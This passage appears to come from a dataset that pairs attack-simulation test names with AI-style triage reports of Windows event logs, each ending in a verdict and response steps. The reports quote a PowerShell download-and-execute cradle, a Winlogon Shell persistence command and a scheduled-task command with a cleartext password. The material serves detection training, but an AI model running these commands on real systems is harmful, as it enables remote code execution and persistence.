   - Identify and remove the `vbsstartup.vbs` files and any other unauthorized scripts from startup directories.
   - Review and reset relevant credentials for `SERVER002\\admin_test` and verify the account's activities.
   
3. **Enhancement of Security Posture**:
   - Implement restrictions on PowerShell execution policies and audit script block logging.
   - Enhance monitoring for unauthorized use of Windows utilities such as `wevtutil.exe`.
   - Regularly audit system time changes and implement alerts for unauthorized changes. 

4. **Revision of Policies**: 
   - Establish and enforce access control policies and least privilege measures for administrative accounts."
PowerShell Modify A Scheduled Task,"Based on the provided logs, here's a detailed analysis:

### Windows PowerShell Log Analysis

The PowerShell logs reveal a script executed to create and modify a scheduled task called ""fileTaskModifed."" The execution details are noteworthy:
- **Scheduled Task Creation**: The task initial action is set to execute `cmd.exe` at logon with the highest privilege level under the group ""BUILTIN\Administrators,"" which indicates a potential for privilege escalation.
- **Modification of Task Action**: The script later modifies the task to execute `Notepad.exe`, a benign application. This workflow could be an attempt to hide malicious intent by initially establishing a foothold using `cmd.exe` and then replacing it with a less suspicious program.

This behavior is suspicious as legitimate administrative tasks do not typically require such intensive PowerShell scripts for task creation, and the switching executables from `cmd.exe` to `Notepad.exe` suggests obfuscation of intent.

### Sysmon Log Analysis

In the Sysmon logs:
- **Frequent Usage of wevtutil.exe and conhost.exe**: The invocation of `wevtutil.exe` typically pertains to the administration of event logs, and regular invocation of `conhost.exe` can indicate command line interactions. These frequent interactions, especially after the PowerShell action, could be used to clear event logs or obfuscate tracking.
- **High Integrity Level Execution**: Processes are executed with high integrity levels by user `admin_test`, tying this back to elevated privileges noted in the PowerShell logs.

### System, Application, and Security Log Analysis

- **Time Changes**: There are security events (ID 4616) showing system time changes, which can be a tactic employed to manipulate timestamps in logs and hinder forensic analysis.
- **Privilege Escalation**: Security Event ID 4672 logs show the assignment of a wide range of privileges to user `admin_test`. These include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are typically used in system-level access or potential escalations.

### Conclusion

Based on the analysis above, the activities observed in the logs are deemed **SUSPICIOUS**. The chain of events indicates multiple red flags such as an abnormal PowerShell task creation and switching executable actions, unusual use of event log utilities, and evidence of privilege escalations followed by time manipulation to conceal these actions.

### Guidance and Next Steps

1. **Conduct Further Investigation**: 
   - Verify with the `admin_test` user or review the user's recent activities to clarify the legitimacy of these actions.
   - Investigate any other correlating logs or user activity around the time these events were recorded.
   
2. **Review System Integrity**:
   - Perform system integrity checks and malware scans to ensure no backdoors or malicious scripts were deployed.
   
3. **Audit Scheduled Tasks**:
   - Review other scheduled tasks on the system for any similar suspicious entries or changes.

4. **Enhance Monitoring**:
   - Consider enabling more detailed logging or implementing stricter policies on PowerShell execution and scheduled tasks, particularly regarding scripts that require administrative privileges.

This course of action should help in determining if any security policy violations have occurred and how to mitigate the risk moving forward."
Suspicious jse file run from startup Folder,"### Detailed Analysis

Upon reviewing the provided logs, several observations and potential security concerns are noted, particularly surrounding PowerShell and script execution activities.

#### Security Log
The security logs provided contain event ID 4616, which indicates a system time change. However, this in itself is not inherently suspicious as system time changes can occur for legitimate reasons such as daylight saving time changes or NTP (Network Time Protocol) synchronization.

#### Windows PowerShell Log
The PowerShell logs indicate the execution of PowerShell commands that involve the copying of a file (`jsestartup.jse`) to the Windows Start-up folder and executing the file using `cscript.exe`. 

- **Command Execution Details:**
  - Copy-Item command copies `jsestartup.jse` to the startup directories.
  - `cscript.exe /E:Jscript` runs the copied `jsestartup.jse` script.

Running scripts on system start-up and using `cscript` in this manner can often indicate an attempt at persistence by malware. The use of `jsestartup.jse` and its association with `cscript.exe` raises suspicion as `.jse` files are typically used to obfuscate JavaScript functionality which might hide malicious code.

#### Sysmon Log
The Sysmon logs display process creations linked to `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe`, among typical system processes. 

- **Processes of Concern:**
  - **PowerShell Process:** The PowerShell process executed commands consistent with activities found in the Windows PowerShell log with the same file path being involved (`jsestartup.jse`).
  - **cscript.exe Execution:** Notable executions of cscript in association with `jsestartup.jse`, aligning with potential malicious persistence mechanisms observed in the PowerShell logs.

These actions suggest evidence of potentially malicious activity designed to establish persistence on the system.

#### Application Log
The application logs primarily show `edgeupdate` service activities, which seem normal for browser update processes. However, given the context of suspicious PowerShell and script activities preceding these logs, it deserves scrutiny in the broader context of system compromise.

#### System Log
Logs concerning kernel time changes and general system maintenance do not directly indicate security concerns, suggesting these logs are benign in the provided context.

### Final Assessment

- **PowerShell and Script Execution:**
  The execution of PowerShell commands that manipulate and execute `.jse` scripts via `cscript.exe` in user start-up folders is highly indicative of potentially malicious behavior. Such actions are typically seen in malware attempting to persist across system reboots and user sessions.

- **Sysmon Activity:**
  The frequent creation and execution of system-related processes shortly before or after the PowerShell activities add further weight to the assessment of potentially malicious activities.

### Conclusion

**Resolution: MALICIOUS**

The logs suggest malicious activity due to the evidence of PowerShell-initiated script copying and execution for persistent access. These activities align with methods frequently utilized by malware to establish persistence and execute on system restart.

### Guidance

1. **Immediate Containment:** Isolate the affected system to prevent further spread or command and control operations.
2. **Forensic Analysis:** Engage in a forensic investigation to determine the extent of the breach, focusing especially on analyzing the `jsestartup.jse` script.
3. **Remediation Measures:** Consider restoring from a known clean backup, removing unauthorized access methods, and updating all security patches.
4. **Review and Strengthen Security Posture:** Implement stricter application control policies, monitor PowerShell usage with advanced logging, and enable real-time threat detection mechanisms."
Winlogon Shell Key Persistence - PowerShell,"Upon reviewing the provided Windows event logs, several observations can be made regarding potentially suspicious activities:

1. **PowerShell Usage:**
   - In the PowerShell logs, we see the command `Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force`. This modification of the registry key related to the Winlogon shell is a classic tactic used in persistence mechanisms by malware to execute a malicious command (in this case, executing `cmd.exe` alongside `explorer.exe` upon user login). This is highly suspicious and potentially indicates malicious activity.

2. **Sysmon Logs Related to PowerShell:**
   - There is a Sysmon event (EventID 1) capturing the execution of `powershell.exe` with the same suspicious command line that modifies the Winlogon registry key. This further corroborates the potential for malicious intent.

3. **Sysmon Logs for Process and Conhost Executions:**
   - There are a series of executions involving `wevtutil.exe` and `conhost.exe` associated with the user `SERVER002\admin_test`. While these activities by themselves might not directly indicate malicious behavior, it is unusual if they have no legitimate reason for execution in a very short timeframe. This could be a sign of an attacker trying to gather system logs or manipulate console outputs.

4. **Security Audit Logs:**
   - While the logs show typical security auditing actions (e.g., logon events), they do not themselves indicate a direct threat. The activity related to `svchost.exe` adjusting system times might warrant a closer look in a broader context but is not immediately suspicious.

Given these findings, the most concerning aspect is the modification of the `HKCU` Winlogon Shell registry key to include `cmd.exe`. This behavior is characteristic of malware attempting to maintain persistence on a system, as it allows the malicious command to be run each time a user logs in. The presence of administrative rights (`IntegrityLevel=""High""`) suggests ample capability for such actions.

**Assessment and Resolution:**
- **MALICIOUS**: The modification of the registry key related to user logon to execute an additional command (`cmd.exe`) is highly indicative of malicious activity. This behavior aligns with known persistence techniques used by various malware families.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential spread or data exfiltration.
   - Conduct a full antivirus and antimalware scan on the system using updated signatures.

2. **Forensic Analysis:**
   - Retrieve and analyze the modified registry key and assess for additional backdoors or malicious commands.
   - Review all commands executed in PowerShell during the timeframe of interest.

3. **Remediation:**
   - Restore the registry settings to a clean state.
   - Consider restoring the system from a clean backup if possible.

4. **Post-Incident Review:**
   - Conduct a thorough investigation to determine the extent of the compromise.
   - Implement improved monitoring and defenses to prevent future incidents, including user education and enhanced access controls if necessary."
LockBit Black - Modify Group policy settings -cmd,"Upon analyzing the provided logs, we can observe several activities related to system operations, process creations, and changes in registry entries. Here's a breakdown of the suspicious and potentially malicious activities observed in the logs:

1. **System Time Change**:
   - The system time was changed twice around ""2024-10-26 19:01:30"" as logged in both the System and Security logs. While time changes could be legitimate system operations, they can also be indicative of attempts to disrupt time-based security mechanisms or maintain remote access without triggering logging events.
   - The changes were made by `svchost.exe`, a legitimate Windows service host process. However, unauthorized changes to the system time require further scrutiny.

2. **Frequent Process Execution**:
   - We observe repeated execution of several processes, including `wevtutil.exe`, `conhost.exe`, and `cmd.exe`. `wevtutil.exe` is a command-line utility that manages event logs, and its repeated invocation might be an attempt to modify, delete, or export event logs covertly.
   - The batch script executed through `cmd.exe` modifies registry entries associated with Group Policy refresh timings and SmartScreen settings. Such registry modifications can be part of policy evasion tactics or attempts to disable security features.

3. **Registry Modifications**:
   - Processes are seen modifying registry entries related to Group Policy update frequencies and SmartScreen settings. Disabling or altering these settings can reduce system security, making endpoints vulnerable.
   - These actions were performed by the user `SERVER002\admin_test`, indicating potential misuse of administrative privileges.

4. **Microsoft Edge Update Processes**:
   - There is a series of processes related to Microsoft Edge Update, which seem to follow typical update patterns. However, log events at such density merit verification with the update schedule or intended activity. Mixed with other unusual commands, these could indicate potential exploitation pathways masked as legitimate software updates.

5. **No PowerShell Logs**:
   - The absence of PowerShell logs means we cannot confirm or rule out PowerShell-based attacks. Given PowerShell's popular use in attacks, verifying that its logs are available and checking for any execution via other logs can be important.

### Assessment
Based on the analysis, there is sufficient deviation from regular operations and administrative activity to class this behavior as concerning. Specifically, the combination of time changes, frequent and unusual process executions under an administrative context, and significant registry alterations point towards suspicious activity.

### Resolution: SUSPICIOUS
This situation contains indicators of potentially unauthorized activity that merits further investigation. It is advisable to:
1. Verify the legitimacy of the administrative actions performed under the `SERVER002\admin_test` account.
2. Examine user intent, environmental context, and any potentially linked user activity.
3. Investigate the registry changes and determine if they align with a planned configuration change.
4. Correlate network activity and other systems for additional suspicious patterns.
5. Review and ensure time synchronization settings are secured and monitored.

Taking these actions should clarify the situation and its potential impact on organizational security."
Domain Password Policy Check: Short Password,"Upon reviewing the provided Windows event logs, particularly focusing on the PowerShell and Sysmon logs, here are my findings:

### PowerShell Log Analysis
1. **PowerShell Script Execution**:
   - The script is performing operations related to user credentials. Specifically, it checks for a credential file (`$env:LOCALAPPDATA\file\$env:USERNAME.txt`), validates if the password stored in it is the same as a new password ""Uplow-1"", and attempts to update the Active Directory account password using `Set-ADAccountPassword`.
   - If the password update fails due to an incorrect stored password (Error code 86), the script prompts the user to correct it by setting the correct credentials and removes the invalid credential file.
   - The script seems to be handling credential management, which can be typical for scripts designed to automate password updates. However, the use of a plaintext password (""Uplow-1"") within the script is a security concern.

2. **Potential Risks**:
   - **Hardcoded Password**: The presence of a hardcoded password in the script is a security weakness. If malicious actors gain access to the script, they could potentially exploit it to escalate privileges.
   - **Credential File**: Storing credentials in a file, even if encrypted, can be risky if insufficient access controls are applied.

### Sysmon Log Analysis
1. **Process Creation Events**:
   - Various system processes, including `wevtutil.exe`, `conhost.exe`, and `powershell.exe`, are executed by the user `SERVER002\admin_test`. These processes do not inherently indicate malicious activity; however, the context in which they operate is significant.
   - The repeated execution of `wevtutil.exe` suggests the possibility of log clearing or manipulation, especially if these actions are unnecessary for the user's typical activities.
   - The `whoami.exe` process execution is aimed at retrieving the current user's permissions, which alone is not suspicious but could imply exploratory actions by a user or script.

2. **Risk of Process Execution**:
   - **wevtutil.exe**: Often used for event log management, frequent usage without valid justification can be a sign of attempts to delete or alter logs to cover tracks.

### Overall Assessment
- The activity in the PowerShell logs indicates potential abuse of credentials management. While the script's actions could be part of a legitimate administrative task, the presence of a hardcoded password signifies a security oversight.
- The Sysmon logs show standard administrative actions, but the context provided by PowerShell logs suggests that these actions might be related to an improper handling of credentials or possibly an attempted compromise.

### Resolution
Given the analysis, the logs exhibit behavior that deserves heightened scrutiny. The presence of poorly managed credential operations and system process manipulation without established baselines suggests potential weaknesses that might be exploited.

**Resolution: SUSPICIOUS**

### Recommendations
1. **Review and Audit Scripts**: Investigate the legitimacy and necessity of the PowerShell script. Ensure that any credentials management follows security best practices, including the use of secure credential storage and avoiding hardcoded passwords.
2. **Enhance Logging and Monitoring**: Strengthen monitoring for unusual patterns in PowerShell scripts and sysadmin utilities such as `wevtutil.exe`.
3. **Access Control Review**: Review access permissions, especially for accounts capable of running these scripts, and ensure they follow the principle of least privilege.
4. **User Awareness and Training**: Educate administrators and users on secure credential handling and awareness of potential security risks associated with script automation."
Allowing custom application to execute during new RDP logon session,"Based on the detailed investigation of the provided Windows event logs, here's the analysis:

### Suspicious and Anomalous Activities:

1. **Cmd.exe Execution**:
   - There is an event with `cmd.exe` executing a command to add a registry key for a startup program (`""calc""`). This is unusual as adding startup entries without explicit user actions might be an indicator of malware persistence techniques. (Sysmon EventID: 17978)

2. **Powershell Execution with Suspicious Command**:
   - Two PowerShell executions with the restricted execution policy run commands. One uses `Write-Host` which is generally benign, but the restricted policy and script use can indicate attempted obfuscation or execution of non-standard scripts in restricted environments. (PowerShell EventIDs: Various)

3. **Taskhostw and CompatTelRunner Activity**:
   - Frequent activity with `taskhostw.exe` and `CompatTelRunner.exe` processes. While these processes are legitimate Windows components, their frequent execution, in conjunction with the above activities, may be anomalous.
   - `CompatTelRunner.exe` activity is related to telemetry data collection but repeated calls could indicate potential misuse unless these align with typical telemetry schedules for updates. 

4. **Wevtutil.exe and Control Panel Process Executions**:
   - Multiple instances of `wevtutil.exe` command are logged (Sysmon EventIDs: 17951 and 17959). This tool is used for managing Windows Event logs, but unauthorized usage might be used to cover tracks.

5. **Elevation of Privileges Detected**:
   - The log contains EventID 4672, indicating special privileges were assigned to the SYSTEM account which might be standard but is essential to monitor in incident response scenarios.

### Overall Assessment:

Based on the logs, there is an observed activity of potential concern, particularly surrounding the `cmd.exe` command modifying the registry for startup programs and the `PowerShell` execution with non-standard activities. The presence of frequent telemetry data collection processes (`CompatTelRunner.exe`) could be normal based on system settings but coupled with suspicious entries indicates a reason to investigate further.

### Final Resolution:
- **SUSPICIOUS** - The logs contain activity that looks questionable, indicating there might be malicious intention behind actions such as modifying the registry to add persistence and the execution of restricted PowerShell commands. Further investigation is advised to confirm or dispel malicious intent.

### Guidance on How to Proceed:
1. **Verify Registry Changes**: Check if the `calc` registry entry was authorized or understand if this is a false-positive for legitimate software behavior.
2. **Review PowerShell Scripts**: Investigate the history of scripts executed to see if any unauthorized changes or scripts were run.
3. **Monitor for Persistence**: Validate if the changes to the startup registry key persist after reboot and address any unauthorized or unexplained persistence.
4. **User and Process Monitoring**: Ensure monitoring on `wevtutil.exe`, `taskhostw.exe`, and `CompatTelRunner.exe` for continued or unauthorized usage.
5. **Privilege Access Monitoring**: Given the presence of privileged access assignments, ensure that this access is reviewed for legitimacy and follow up with user actions that coincide with these logs.

This course of action is prudent to ensure security is maintained while validating if a compromise might have occurred."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"Upon reviewing the provided Windows event logs, here's the analysis with a focus on indicators of potential malicious activity:

**System Log Analysis:**
1. The logs show multiple instances of time change events (Event ID: 1, 24) with `svchost.exe` as the executing process. While system time changes can be legitimate actions by the system or administrators, they can also be leveraged by malware or attackers to disrupt time-based security measures. Here, no obvious signs point to a compromise based solely on these events.

**Security Log Analysis:**
2. The security logs (Event ID: 4616) confirm the time changes done by the `LOCAL SERVICE` account, which is consistent and expected if automated by system services.

**Application Log Analysis:**
3. The logs show normal application logging activities indicating software protection platform checks and Windows Defender states.

**PowerShell Log Analysis:**
4. The PowerShell logs contain evidence of PowerShell script execution using the command:
   ```
   powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
   ```
   This technique, downloading and executing a script from an external source, is often indicative of malicious activity, typically seen in common attack vectors.

**Sysmon Log Analysis:**
5. The Sysmon logs reveal legitimate processes like `hostname.exe`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe`. However, additional activities include PowerShell execution with the previously mentioned command, further corroborating potentially malicious behavior.

**Assessment and Conclusion:**
The presence of PowerShell executing a script from an external URL is a strong indicator of potentially malicious activity. This behavior is consistent with initial access or lateral movement tactics of attackers to execute or download malicious payloads remotely.

**Resolution: MALICIOUS**
- Given the PowerShell command execution using `iex(new-object net.webclient).downloadstring(...)` from an external URL and without any modification to the script’s URL or known whitelisting, it's highly indicative of a malicious activity attempting to run or download scripts from an external source.
- The observed behavior matches common attack patterns where attackers leverage PowerShell to download and execute scripts as a means of introducing malware into the system.

**Recommended Next Steps:**
- Isolate the affected system to prevent potential data exfiltration or lateral movement.
- Conduct a full malware scan of the system and any other potentially connected systems.
- Review and potentially block the domain `raw.githubusercontent.com` if not used for legitimate business purposes.
- Investigate the source and context of PowerShell execution to determine if further compromise has occurred.
- Enhance PowerShell logging and consider the use of Application Whitelisting to mitigate execution of unauthorized scripts."
HKLM - Add atomic_test key to launch executable as part of user setup,"### Analysis of Logs

#### Windows PowerShell Logs Analysis
- A series of PowerShell commands were executed on the host, focusing on the registry under ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components"".
- A new item was created called ""file_test"", with properties set such as ""(Default)"" to ""ART TEST"" and ""StubPath"" to ""C:\Windows\System32\calc.exe"".
- The execution of the command `$env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup` was noted, potentially indicating a persistence mechanism by adding `calc.exe` to run once upon user login or some specific startup condition.

#### Sysmon Logs Analysis
- Multiple instances of `wevtutil.exe` and `conhost.exe` executed, owned by user ""SERVER002\admin_test"". These appear primarily related to managing or interfacing with Windows event logs and console sessions.
- PowerShell execution is noted with a command that matches the suspicious registry entries seen in the PowerShell log, combining scriptblock execution with `runonce.exe` to achieve persistence.
- We observe the legitimate use of `calc.exe`, spawned by `runonce.exe`, which might indicate testing or misuse given the context.

#### Security Logs Analysis
- Time adjustment events typically indicate normal synchronizations, in this case from the time source `time.windows.com`. These are considered benign and normal for system operations, especially given the `TimeZoneInfoCacheUpdated` value indicating no user meddling with the system time zone settings.

#### System Logs Analysis
- No anomalies outside of expected operations such as time synchronizations were noted.
  
#### Application Logs Analysis
- Microsoft Edge update services reported as ""Service stopped"" indicate regular service lifecycle management and are not inherently suspicious.

### Assessment and Conclusion
The amalgamation of registry modification, especially the suspicious setting of a `StubPath` to execute `calc.exe`, although a benign application typically, suggests testing or a potential attempt at setting a persistence mechanism for more nefarious purposes.

Given:
- The use of PowerShell to modify registry keys.
- The invocation of `RunOnce` via `runonce.exe` which indicates potential persistence being set up.
- The Sysmon logs showing `PowerShell` execution context alongside process events.

The activity does raise concerns, particularly with the modification of the registry to include executable paths for startup without explicit user-based needs or documented change processes. This follows a common pattern seen in post-exploitation scenarios or when a system is being prepared for further attacks.

### Resolution
- **SUSPICIOUS**: The behavior seen does not conclusively confirm malicious activity but strongly suggests improper use—either for legitimate testing, misconfiguration or a preliminary staging point for illicit actions.
- **Guidance**: Further investigation and monitoring are necessary. Access records, administrative actions, and other related logs around the same timeframe should be examined for clarity or indications of an authorized testing scenario. Additionally, engage with relevant teams to verify the legitimacy of the changes or escalate for deeper forensic analysis."
Read-Write-Execute process Injection,"### Analysis of Logs

Upon reviewing the Windows event logs for any suspicious or malicious activity, several points should be considered:

1. **Sysmon Log Observations**:
   - The frequent execution of legitimate Windows utilities such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `whoami.exe` under the account `SERVER002\\admin_test` raises questions concerning the sequences and contexts of their execution.
   - The process `powershell.exe` is invoked with a complex command line that appears to be utilizing temporary files and scripts located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\`). This is a common tactic used in attacks or lateral movements where files and scripts are executed from temporary locations.
   - Execution attempts of binaries like `searchVuln.exe` and `RWXinjectionLocal.exe` within the Powershell command line are particularly concerning. These names suggest that the executables may attempt to find vulnerabilities or perform code injection.
   - The use of `wevtutil.exe` is notable as it is commonly used by attackers to clear event logs, though it can also be used legitimately for querying event log data.

2. **PowerShell Log Observations**:
   - The PowerShell logs contain a command that involves running a script designed to find and leverage vulnerabilities (`searchVuln.exe`) and possibly perform in-process injection (`RWXinjectionLocal.exe`).
   - These activities are indicative of an attempt to exploit known vulnerabilities or perform in-memory execution – a suspicious pattern that might indicate a breach or attempted attack.

3. **Anomalous Behavior**:
   - The consistent use of legitimate tools in suspicious sequences from a temporary location by an admin account suggests potentially malicious behavior or unauthorized testing activity.
   - Execution of binaries with potential malicious intent suggests this may not be sanctioned operational behavior.

### Assessment and Conclusion
- **Threat/Risks Identified**: 
  - Potential privilege escalation or lateral movement within the network using PowerShell and custom executables.
  - Possible attempt at stealthy log manipulation or exploitation attempts using `wevtutil.exe`.
  - Use of tools commonly associated with malware or penetration testing frameworks indicates high risk.

Given the evidence in the logs, especially the pattern of PowerShell activity and the execution of suspicious executables along with Windows utilities, this activity does not appear to be part of regular system administration or maintenance tasks. The characteristics align with techniques used in sophisticated attacks.

### Resolution
- **MALICIOUS**: The event logs contain activity patterns and execution traces that strongly suggest malicious intent, likely indicating a breach or unauthorized exploitation attempt.

### Guidance
- **Immediate Actions**:
  - Isolate the affected system to prevent further proliferation within the network.
  - Conduct a thorough forensic investigation on `Server002` to determine the extent of the breach.
  - Review other systems for similar activity to identify potential additional compromises.
  - Update and continually monitor security systems to detect any further anomalous behavior.

- **Long-Term Recommendations**:
  - Educate staff on the risks of elevated permissions misuse.
  - Regularly audit systems and accounts for unauthorized access or configuration changes.
  - Enhance monitoring with specific detections for PowerShell misuse and unauthorized file executions."
Scheduled task Remote,"Based on the analysis of the provided Windows event logs, the following observations can be made:

1. **Time Changes**:
   - There are multiple entries in the System and Security logs indicating changes to the system time, primarily by `svchost.exe`. Frequent or unauthorized changes to system time can be a tactic used by malicious actors to manipulate timestamps for various activities, such as logs or file timestamps, though in some cases this can be legitimate.
   - The time adjustment logs (Security log Event ID: 4616 and System log Event ID: 1) reflect backward time adjustments.

2. **Execution of Scheduled Tasks**:
   - The Sysmon log entries reflect the execution of `schtasks.exe` with the command `""cmd.exe"" /c SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN ""file task"" /TR ""C:\\windows\\system32\\cmd.exe"" /SC daily /ST 20:10""`.
   - The use of `SCHTASKS` to create tasks with the parameters provided can be used by administrators but is suspicious without context. The use of passwords (`/RP At0micStrong`) in clear text, especially if not documented or verified as part of routine operations, can indicate an attempt to persist a malicious task.

3. **Unusual Process Executions**:
   - Execution of several system utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, typically used for administrative purposes, is observed. While not inherently malicious by themselves, frequent executions in rapid succession or as part of automation scripts might indicate scanning or information gathering.
   - The use of high integrity levels suggests administrative privileges, which can be both normal and a risk factor if leveraged inappropriately.

4. **User Activity**:
   - The account `SERVER002\\admin_test` is observed executing numerous processes, including PowerShell, `wevtutil`, and other command-line utilities which are legitimate tools but their unauthorized or excessive use could indicate a breach.

**Assessment**:
- The system time changes, task scheduling, and administrative tool executions are noteworthy but do not immediately confirm malicious activity without additional context. However, the scheduling of tasks with a username and password in clear text is concerning and represents a potential security risk or malicious intent.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Further Investigation**:
   - Confirm the legitimacy of the scheduled task `file task`. Is this expected as part of normal operations? Verify with administrative staff or records.
   - Investigate if the `admin_test` account activities were authorized and whether the account has been used appropriately without compromise.
   - Check system logs surrounding the events to identify any unusual patterns preceding or following these entries.
   
2. **Mitigation Measures**:
   - Restrict the use of task scheduling (`schtasks.exe`) and other administrative command-line tools to authorized personnel only.
   - Implement monitoring and alerting for similar activities in the future.
   - Consider rotating credentials and reviewing password policies to prevent the use of clear text passwords in task configurations.

3. **Preventive Steps**:
   - Educate users about secure password practices and prevent saving passwords in scripts or logs.
   - Regular audits and reviews of scheduled tasks and admin activities on critical systems.

The situation warrants a closer examination to rule out or confirm any potential threats or vulnerabilities."
Section View Injection,"### Detailed Analysis of the Logs

1. **Security Log Analysis:**
   - **Event ID 4616:** Indicates changes in system time, which is suspicious if no legitimate reason is known. Time manipulation could be done to mask activities.
   - **Event ID 4634 and 4624:** Reflect logon (4624) and logoff (4634) of the `admin_test` account via NTLM using LogonType 3 (network logon). This is typical of remote access, but requires further context since NTLM can also be involved in lateral movement by attackers.
   - **Event ID 4672:** This user (`admin_test`) exercised advanced privileges (such as SeDebugPrivilege and SeLoadDriverPrivilege), which should be justified or audited to ensure it aligns with job function and legitimate activity.

2. **Sysmon Log Analysis:**
   - Multiple executions of system binaries (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) as well as a PowerShell execution. While execution of system binaries (like `whoami.exe`) may be normal for administrative scripts, the combination and frequency, especially the usage of PowerShell, can be indicative of reconnaissance or scripting activity by an attacker.
   - **PowerShell Execution:** Particularly, the script executed includes starting Notepad and `InjectView.exe`, the latter being suspicious due to its location in a temp directory and naming convention that might suggest DLL injection or similar action.
   
3. **Application Log Analysis:**
   - No particular indicator of compromise found within the provided application logs, except function-related logs for the domain environment software (SPP).

4. **System Log Analysis:**
   - **Event ID 1 and 24:** Manipulation of system time (`svchost.exe` involved) aligns with security log observations and could again suggest an attempt to confuse or obfuscate logs.

5. **PowerShell Log Analysis:**
   - Logs corroborate the suspicious PowerShell script execution (`InjectView.exe`), an execution process potentially aimed at deploying or testing injective techniques.

### Assessment

The review of these logs reveals patterns and specific entries suggestive of potentially malicious activity. The manipulation of the system time, PowerShell execution involving less-known external executables, and the advanced privileges used by the `admin_test` account stand out as notable observations that warrant further investigation.

### Resolution

**SUSPICIOUS**

Given the behaviors observed—particularly the suspicious PowerShell execution, the system time changes, and the elevated privilege usage—a deeper investigation is recommended. Steps to proceed include:
- **Validate Activity Source:** Determine if the `admin_test` account actions align with expected tasks and whether the equipment with IP address `192.168.1.168` is trusted, checking logs for any historical deviation.
- **Review File at Path:** Investigate `InjectView.exe` for potential malicious properties.
- **Audit Time Changes:** Find the root cause for time modifications and if such actions are documented and approved.
- **Environment Hardening:** Raise awareness and establish further monitoring on administrative actions, especially when involving powerful scripts and advanced privileges."
EarlyBird APC Queue Injection in Go,"Here's a detailed analysis of the provided logs:

### Summary of Anomalous Behavior
1. **Process Execution:**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` by the user `SERVER002\admin_test`.
   - Notably, `powershell.exe` is being executed with the command to run `EarlyBird.exe` in combination with `werfault.exe`, which is uncommon and potentially malicious behavior. The `EarlyBird` technique is known for injecting malicious processes.

2. **Command-Line Arguments:**
   - The command line of `powershell.exe` includes paths to a temporary file and uses `werfault.exe`, typically used for error reporting, which can be misused for malicious purposes.

3. **Privilege Escalation:**
   - The user `admin_test` has numerous high-level privileges listed in the Security logs, such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This might suggest privilege escalation or the use of an administrative account in an unusual manner.

4. **Time Manipulation:**
   - Security logs suggest a potential manipulation of system time (`EventID 4616`). This could be an attempt to obscure malicious activity timelines.

5. **Network Connections:**
   - There are logs showing NTLM authentication from a remote workstation (`DESKTOP-3HL5B2P`), potentially indicating lateral movement.

### Malicious Indicators
- **PowerShell & EarlyBird.exe Execution:** The combination of the PowerShell execution with `EarlyBird.exe` and `werfault.exe` raises significant suspicion of malicious activity.
- **High Integrity Executions:** Actions were performed with a high integrity level, suggesting administrative privileges are being leveraged, likely for carrying out unauthorized tasks.
- **Time Skew:** The adjustment of system time could reflect an attempt to hide traces of the malicious activity.

### Assessment and Resolution
Based on the logs, the execution of PowerShell with suspicious command-line arguments, high integrity privileges usage, and evidence of potential time manipulation, strongly indicate malicious activity.

- **Resolution:** **MALICIOUS**

### Recommendations for Next Steps
1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent further potential damage or data exfiltration.
   - Reset credentials for `admin_test` and investigate if the account was compromised.

2. **Detailed Investigation:**
   - Conduct a full forensic analysis of the affected server. Examine the filesystem and memory for any signs of additional payloads or malware variants.
   - Review firewall logs and other telemetry data for further indicators of compromise and to understand the full scope of the incident.

3. **Remediation:**
   - Apply security patches and conduct a thorough review of account permissions and policies.
   - Ensure robust endpoint protection is in place, with active monitoring and alerting for unusual activities.

4. **Post-Incident Review:**
   - Perform a root cause analysis to understand how the compromise occurred and to identify any weaknesses in the security posture.
   - Implement additional detection rules specific for PowerShell abuse and process injection techniques.

By following these steps, you can effectively address the detected threat and improve the security posture against similar attacks in the future."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"After a thorough analysis of the provided event logs across various channels (Application, Windows PowerShell, System, Security, and Sysmon logs), several points of interest and potential areas of concern can be identified:

### Suspicious Activities Identified:
1. **Unusual PowerShell Activity**:
   - Multiple PowerShell events show commands that alter the Security Packages in the registry. The script appears to replace the current LSA security packages with a new entry, ""AtomicTest.dll"". This activity is highly suspicious as modifying the LSA Security Packages can be used to introduce malicious code to intercept authentication credentials or alter security settings.

2. **Log Clearing Events**:
   - The system, application, and security logs were cleared by the user ""admin_test"". Clearing event logs is often an attempt to cover tracks in a compromised system.

3. **EdgeUpdate Service Restarts and Executions**:
   - There are multiple instances of ""MicrosoftEdgeUpdate.exe"" executing with various command-line arguments. While these are often legitimate update activities, given they coincide with other suspicious behaviors, they warrant further investigation to determine if they were used as a vector for exploitation.

4. **Time Anomalies**:
   - There are events reflecting time changes on the system which can be an attempt to manipulate time stamps on event logs and other system records to confuse forensic analysis.

5. **Execution of Sppsvc and TiWorker**:
   - ""C:\Windows\System32\sppsvc.exe"" and ""TiWorker.exe"" are being executed. While they generally represent legitimate system processes for software protection and Windows Update, given the context, they should be verified for tampering or anomalous behavior.

### Assessment:
- The presence of PowerShell commands modifying critical registry keys related to security settings, coupled with the clearing of event logs by an administrative user, suggest an attempt to tamper with system security settings and cover tracks post compromise.
- The analyzed activities, especially the modification to the registry (Security Packages), align with tactics seen in malicious activities aimed at gaining persistent access or credential theft.
